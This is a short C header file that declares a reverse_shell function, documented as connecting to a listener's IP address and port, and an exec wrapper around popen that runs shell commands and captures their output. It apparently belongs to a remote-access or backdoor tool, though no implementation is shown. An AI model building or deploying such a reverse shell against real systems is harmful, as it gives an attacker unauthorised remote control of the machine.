#ifndef UTILS_H
#define UTILS_H

#include "../include/types.h"

#define EXIT_COMMAND "exit\n"

/** 
 * Reverse shell using exec
 * 
 * It has the same limitations as exec. You can end the reverse shell by typing exit.
 * 
 * ip_addr - String with ip address of the listener
 * port - int where the port goes.
 * 
 * Returns - OK or ERROR
*/
int reverse_shell(char *ip_addr, int port);

/** 
 * Wrapper for popen
 * 
 * Should be able to execute basic commands on the shell. Same as if you used them directly on popen.
 * 
 * Command - String with the command to execute
 * Output - String where the output of the command is saved. Memory is allocated inside.
 * 
 * Returns - OK or ERROR
*/
int exec(char *command, char **output);

#endif